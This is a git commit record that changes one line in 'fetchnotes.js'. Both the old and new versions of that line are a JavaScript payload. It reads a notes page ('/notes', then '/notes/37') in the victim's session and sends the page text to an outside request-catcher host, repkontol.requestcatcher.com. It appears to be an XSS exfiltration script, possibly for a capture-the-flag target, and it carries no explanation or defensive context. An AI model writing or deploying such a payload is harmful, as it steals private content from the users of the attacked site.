c4b5a1093512a8c9022255bdc2e620d6874452bd
t101804 <113588203+t101804@users.noreply.github.com>
2025-03-30 21:04:40 +0700

    Update fetchnotes.js

--- fetchnotes.js
+++ fetchnotes.js
@@ -1,1 +1,1 @@
-fetch('/notes').then(r => r.text()).then(text => fetch(`https://repkontol.requestcatcher.com?data=${encodeURIComponent(text)}`));
+fetch('/notes/37').then(r => r.text()).then(text => fetch(`https://repkontol.requestcatcher.com?data=${encodeURIComponent(text)}`));
